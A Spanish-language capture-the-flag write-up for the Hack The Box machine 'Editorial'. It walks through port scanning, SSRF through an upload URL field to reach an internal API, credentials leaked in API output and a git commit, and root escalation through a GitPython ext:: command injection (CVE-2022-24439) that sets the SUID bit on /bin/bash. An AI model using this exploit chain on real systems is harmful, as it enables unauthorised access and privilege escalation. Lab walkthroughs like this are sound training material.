---
title: Editorial - Hack The Box
date: 2024-10-04
description: Maquina Editorial (Easy) de Hack The Box.
categories:
    - Writeups
    - HTB
tags:
    - Linux
    - HTB
    - CTF
    - Easy
    - Seasonal
media_subpath: /assets/img/commons/editorial/
image: editorial.png
---

## Escaneo

```bash
nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 10.10.11.20 -oG allPorts
```

Puertos abiertos: 22 y 80

## Análisis

```bash
nmap -sCV -p22,80 10.10.11.20 -oN targeted

`22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

El puerto 80 da acceso a la web de http://editorial.htb

En la web no hay nada destacable a excepción del apartado "Publish with us" que lleva a http://editorial.htb/upload.

En upload, permite proveer libros a la web de dos formas: subiendo el fichero o a través de la url.

Al subir un fichero o facilitar una URL, devuelve la URL del fichero subido:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 02 Oct 2024 14:52:31 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 51`

static/uploads/61089ce8-87f6-4a5f-83e6-1e21a65c3335`
```

## Explotación

Pasándole como URL la localhost y atacando los 65532 puertos se puede evaluar, viendo el tamaño del "`Content-Length`" si hay una respuesta distinta, lo que puede implicar que el puerto esté abierto y respondiendo solo a consultas internas.
A excepción del puerto 5000 con 51, todos los puertos restantes devuelven lenght 61.

Al hacer GET de la URL devuelta por el puerto 5000 se obtiene un json de parámetros de una API:

```json
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}`
```

Una consulta POST contra "/api/latest/metadata/messages/authors" devuelve una URL que al hacerle GET devuelve un JSON con credenciales:

```json
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}`
```

>Username: dev  
>Password: dev080217_devAPI!@  

El usuario tiene acceso por SSH y al conectarse se obtiene la User Flag.

## Escalada

Listando los ficheros con permisos de root:

```bash
find / -perm -4000 -user root 2>/dev/null

/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/umount
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/su
```

Nada destacable.

En la carpeta home existe la carpeta `.git`
Con `git log` se ve un commit con la información:

```
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.`
```

Consultando los cambios de este commit con `git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae` se extrae un usuario y contraseña de producción:

```bash
WARNING: terminal is not fully functional
Press RETURN to continue 
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest  regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
# -------------------------------
```

>Username: prod  
>Password: 080217_Producti0n_2023!@  

Accediendo a este usuario por SSH se observa que no tiene credenciales de root:
```bash
ssh prod@10.10.11.20
prod@editorial:~$ sudo su
Sorry, user prod is not allowed to execute '/usr/bin/su' as root on editorial.
```
Pero sí tiene permiso para ejecutar una aplicación en python3 con credenciales de root:
```bash
prod@editorial:~$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

```bash
prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py 
```

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

Esta aplicación es vulnerable a RCE segun el [CVE-2022-24439](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858):

```python
from git import Repo
r = Repo.init('', bare=True)
r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
```

Por lo que se modifica bash para permitir el escalado:

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% u+s% /bin/bash'

$ /bin/bash -p
bash-5.1# whoami
root
```

Como root se tiene acceso a la Root Flag.
